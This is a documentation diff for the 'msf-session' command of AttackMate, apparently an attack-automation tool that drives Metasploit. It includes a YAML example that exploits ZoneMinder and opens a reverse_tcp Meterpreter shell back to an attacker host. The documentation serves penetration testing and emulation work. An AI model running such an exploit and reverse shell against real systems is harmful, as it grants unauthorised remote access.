@@ -4,64 +4,77 @@
 msf-session
 ===========
 
-This command allows to read and write commands to (Meterpreter)sessions that
-have previously created by msf-modules(see :ref:`msf-module`).
+Execute commands in an active Meterpreter session previously opened by an
+:ref:`msf-module` command.
+
+.. note::
+
+   To configure the connection to ``msfrpcd``, see :ref:`msf_config`.
 
 .. code-block:: yaml
 
       commands:
+        # First, exploit a vulnerability and create a session:
         - type: msf-module
-           cmd: exploit/unix/webapp/zoneminder_snapshots
-           creates_session: "foothold"
-           options:
-             RHOSTS: 192.42.0.254
-           payload_options:
-             LHOST: 192.42.2.253
-           payload: cmd/unix/python/meterpreter/reverse_tcp
+          cmd: exploit/unix/webapp/zoneminder_snapshots
+          creates_session: foothold
+          options:
+            RHOSTS: 192.42.0.254
+          payload: cmd/unix/python/meterpreter/reverse_tcp
+          payload_options:
+            LHOST: 192.42.2.253
 
+        # Then, execute a command in the session:
         - type: msf-session
-          session: "foothold"
+          session: foothold
           stdapi: True
           cmd: getuid
 
-.. note::
 
-   To configure the connection to the msfrpc-server see :ref:`msf_config`
+.. confval:: session
+
+   Name of the session to operate in. Must have been created previously by an
+   :ref:`msf-module` command using :confval:`creates_session`.
+
+   :type: str
+   :required: True
+
+
+.. confval:: cmd
+
+   Command to execute in the session.
+
+   :type: str
+
 
 .. confval:: stdapi
 
-   Load stdapi module in the Meterpreter-session.
+   Load the stdapi extension in the Meterpreter session before executing the command.
+   Required for many standard Meterpreter commands.
 
    :type: bool
    :default: ``False``
 
 .. confval:: write
 
-   Execute a raw write-operation without reading the output.
+   Execute a raw write-operation to the session without reading the output.
 
    .. note::
 
-      If read and write are both true, the programm will first write and then read.
+      If both ``write`` and ``read`` are ``True``, AttackMate will first write and then read.
 
    :type: bool
    :default: ``False``
 
 .. confval:: read
 
-   Execute a raw read-operation without a write-operation.
+   Execute a raw read-operation from the session without a preceding write-operation.
 
    :type: bool
    :default: ``False``
 
-.. confval:: session
-
-   Use this session for all operations.
-
-   :type: str
-   :required: True
-
 .. confval:: end_str
 
-   This string indicated the end of a read-operation.
+   String indicating the end of a read-operation.
 
    :type: str
